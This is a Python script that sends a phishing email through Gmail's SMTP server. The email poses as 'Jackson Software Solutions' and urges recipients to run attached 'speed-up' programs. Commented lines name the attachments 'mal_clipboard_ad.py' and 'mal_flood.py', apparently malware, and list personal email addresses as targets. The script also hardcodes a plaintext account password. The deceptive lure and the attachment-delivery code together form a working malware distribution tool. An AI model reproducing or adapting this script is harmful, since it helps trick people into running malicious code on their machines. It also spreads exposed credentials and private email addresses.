from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase 
from email import encoders 
import smtplib

#emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
#files = ['mal_clipboard_ad.py','mal_flood.py']

def send_email(emails,files):
	server = smtplib.SMTP('smtp.gmail.com', 587) #to connect with the smtp gmail server
	server.ehlo()
	server.starttls() #STARTTLS is a way to take an existing insecure connection and upgrade it to a secure connection using SSL/TLS.

	server.login("jacksonsoftwaresolutions@gmail.com", "Bt(c@245")

	msg = MIMEMultipart()
	msg['Subject'] = 'Protect your Computer now with Jackson Software Solutions'
	msg['From'] = "jacksonsoftwaresolutions@gmail.com"
	msg['To'] = emails

	html_txt = """
	<html>
		<body>
			
			<h2> Jackson Software Solutions can help you </h2>
			<img src="https://www.avineon.com/sites/default/files/Software-Solutions_1285x588.jpg" alt="Company logo" width="90%">
			<h3> Has your computer been getting slow and troublesome?</h3>
			<h4> We have the solution to everything with a few programs that can 
			optimize the RAM to work properly with the processor and make your system super fast!</h4>
		
			<p> All you need to do is run these programs to maximize the power of your system to make it faster than
			ever before. We at Jackson Software Solutions want you to be safe and have the most pleasant experience while
			using your computer.
			</p>

			<p><b>Yours Faithfully,<br>
			Xavier Jackson<b></p>
			
		</body>
	</html>
	"""

	part = MIMEText(html_txt, 'html')

	msg.attach(part)


	for item in files:
		attachment = open(item, "rb") 
		
		p = MIMEBase('application', 'octet-stream') 
		 
		p.set_payload((attachment).read()) 
		  
		encoders.encode_base64(p) 
		   
		p.add_header('Content-Disposition', "attachment; filename= %s" % item) 
		  
		msg.attach(p) 

	text = msg.as_string() 
  
	# sending the mail 
	server.sendmail(["jacksonsoftwaresolutions@gmail.com"], emails, text) 
	  
	# terminating the session 
	server.quit() 
